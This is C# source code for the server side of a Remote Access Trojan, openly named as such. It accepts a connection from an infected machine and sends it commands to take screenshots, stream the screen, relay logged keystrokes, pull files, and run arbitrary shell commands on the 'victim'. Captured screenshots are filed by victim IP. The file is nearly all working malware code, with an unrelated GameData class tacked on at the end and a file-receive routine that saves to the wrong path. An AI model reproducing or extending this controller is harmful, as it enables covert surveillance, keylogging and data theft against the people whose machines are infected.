// Server side of the RAT (Remote Access Trojan) application

using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.Collections.Generic;


class Server
{

    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount); 

    
    static void Main()
    {
        int port = 8888;
        TcpListener server = new TcpListener(IPAddress.Any, port);

        Console.WriteLine("[Server] Starting on port " + port + "...");
        server.Start();
        Console.WriteLine("[Server] Waiting for client to connect...");

        using (TcpClient client = server.AcceptTcpClient())
        {
            Console.WriteLine("[Server] Connection established!");

            using (NetworkStream stream = client.GetStream())
            {
                // 1. Read the client's IP address string immediately upon connection
                string clientIP = ReceiveIPAddress(stream);
                Console.WriteLine($"[Server] Client identified with IP: {clientIP}");

                // 2. Define and create the specific folder path for this IP
                string targetFolder = $"/home/thomas/screens/{clientIP}";
                try
                {
                    if (!Directory.Exists(targetFolder))
                    {
                        Directory.CreateDirectory(targetFolder);
                        Console.WriteLine($"[Server] Created directory: {targetFolder}");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[Server Error] Could not create directory: {ex.Message}");
                    targetFolder = "/home/thomas"; // Fallback path if directory creation fails
                }

                while (true)
                {
                    Console.Write("Enter a command ('screenshot', 'streammode', 'exit'): ");
                    string command = Console.ReadLine();
                    if (string.IsNullOrEmpty(command)) continue;

                    SendCommand(stream, command);

                    if (command.ToLower() == "exit")
                        break;

                    else if (command.ToLower() == "screenshot")
                    {
                        ReceiveSingleScreenshot(stream, targetFolder);
                    }
                    else if (command.ToLower() == "streammode")
                    {
                        Console.WriteLine("[Server] Continuous stream started. Press ENTER to stop streaming...");
                        
                        while (!Console.KeyAvailable || Console.ReadKey(true).Key != ConsoleKey.Enter)
                        {
                            if (stream.DataAvailable)
                            {
                                ReceiveSingleScreenshot(stream, targetFolder);
                            }
                            System.Threading.Thread.Sleep(50);
                        }

                        Console.WriteLine("\n[Server] Sending STOP command...");
                        SendCommand(stream, "stop");
                    }
                    else if (command.ToLower() == "keylog")
                    {
                        Console.WriteLine("[Server] Keyloging. Press ENTER to stop streaming...");
                        
                        while (!Console.KeyAvailable || Console.ReadKey(true).Key != ConsoleKey.Enter)
                        {
                            if (stream.DataAvailable)
                            {
                                // 1. Read the total number of items contained in this second's array (4 bytes)
                                byte[] countBuffer = ReadExactly(stream, 4);
                                int stringCount = BitConverter.ToInt32(countBuffer, 0);

                                Console.WriteLine($"\n[{DateTime.Now:HH:mm:ss}] Incoming batch containing {stringCount} items:");

                                // Initialize a temporary array for this second's data
                                string[] currentBatch = new string[stringCount];

                                // 2. Read exactly 'stringCount' elements to complete this specific batch
                                for (int i = 0; i < stringCount; i++)
                                {
                                    // Read individual string size header
                                    byte[] sizeBuffer = ReadExactly(stream, 4);
                                    int stringByteLength = BitConverter.ToInt32(sizeBuffer, 0);

                                    // Read individual string payload
                                    byte[] stringBuffer = ReadExactly(stream, stringByteLength);
                                    currentBatch[i] = Encoding.UTF8.GetString(stringBuffer);
                                    
                                    Console.WriteLine($"  -> [{i}]: {currentBatch[i]}");
                                }
                            }


                            System.Threading.Thread.Sleep(50);
                        }

                        Console.WriteLine("\n[Server] Sending STOP command...");
                        SendCommand(stream, "stop");
                    }
                    else if (command.StartsWith("requestFile ", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] parts = command.Split(new char[] { ' ' }, 2);

                        if (parts.Length == 2)
                        {
                            string fileName = parts[1].Trim();

                            Console.WriteLine("Requested file: " + fileName);

                            ReceiveFile(stream, fileName);
                        }
                        else
                        {
                            Console.WriteLine("Missing file name.");
                        }
                    }
                    else 
                    {
                        Console.WriteLine("[Server] Unknown command. Sending to victim's Shell.");
                        ReceiveSingleData(stream);
                    }
                }
            }
        }

        Console.WriteLine("[Server] Closing connection.");
        server.Stop();
    }

    private static void SendCommand(NetworkStream stream, string cmd)
    {
        byte[] cmdBytes = Encoding.UTF8.GetBytes(cmd);
        stream.Write(cmdBytes, 0, cmdBytes.Length);
        stream.Flush();
    }

    // Reads the initial IP address payload from the client
    private static string ReceiveIPAddress(NetworkStream stream)
    {
        byte[] sizeBuffer = ReadExactly(stream, 4);
        int ipSize = BitConverter.ToInt32(sizeBuffer, 0);
        byte[] ipBytes = ReadExactly(stream, ipSize);
        return Encoding.UTF8.GetString(ipBytes).Trim();
    }

    public static void ReceiveSingleData(NetworkStream stream)
    {
        ReceiveString(stream);
    }

    private static string ReceiveString(NetworkStream stream)
    {
        try
        {
            byte[] sizeBuffer = ReadExactly(stream, 4);
            int payloadSize = BitConverter.ToInt32(sizeBuffer, 0);

            byte[] payload = ReadExactly(stream, payloadSize);

            string message = Encoding.UTF8.GetString(payload);

            Console.WriteLine("[Received String]");
            Console.WriteLine(message);

            return message;
        }
        catch (Exception ex)
        {
            Console.WriteLine("[Server Error] Failed to receive string: " + ex.Message);
            return null;
        }
    }
    public static void ReceiveFile(NetworkStream stream, string saveFolder)
    {
        byte[] nameLenBuf = ReadExactly(stream, 4);
        int nameLen = BitConverter.ToInt32(nameLenBuf, 0);

        byte[] nameBuf = ReadExactly(stream, nameLen);
        string fileName = Encoding.UTF8.GetString(nameBuf);

        byte[] sizeBuf = ReadExactly(stream, 8);
        long fileSize = BitConverter.ToInt64(sizeBuf, 0);

        string savePath = saveFolder;

        using (FileStream fs = File.Create(savePath))
        {
            byte[] buffer = new byte[8192];
            long remaining = fileSize;

            while (remaining > 0)
            {
                int toRead = (int)Math.Min(buffer.Length, remaining);
                int read = stream.Read(buffer, 0, toRead);

                if (read <= 0)
                    throw new IOException("Connection closed.");

                fs.Write(buffer, 0, read);
                remaining -= read;
            }
        }

        Console.WriteLine("Received: " + savePath);
    }

    private static void ReceiveSingleScreenshot(NetworkStream stream, string targetFolder)
    {
        try
        {
            byte[] sizeBuffer = ReadExactly(stream, 4);
            int payloadSize = BitConverter.ToInt32(sizeBuffer, 0);

            byte[] payload = ReadExactly(stream, payloadSize);

            string checkMsg = Encoding.UTF8.GetString(payload);
            if (checkMsg.StartsWith("ERROR"))
            {
                Console.WriteLine($"[Server Error] Client failed: {checkMsg}");
            }
            else
            {
                // Save inside the custom IP directory
                string savePath = Path.Combine(targetFolder, $"stream_{DateTime.Now:yyyyMMdd_HHmmss_fff}.png");
                File.WriteAllBytes(savePath, payload);
                Console.WriteLine($"[Received] Saved: {savePath} ({payloadSize} bytes)");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[Server Error] Failed to receive image data: {ex.Message}");
        }
    }

    private static byte[] ReadExactly(NetworkStream stream, int size)
    {
        byte[] buffer = new byte[size];
        int totalRead = 0;
        while (totalRead < size)
        {
            int read = stream.Read(buffer, totalRead, size - totalRead);
            if (read == 0) throw new Exception("Connection lost while reading stream.");
            totalRead += read;
        }
        return buffer;
    }

}

public class GameData
{
    public int Score { get; set; }
    public string PlayerName { get; set; }
    public bool IsActive { get; set; }
}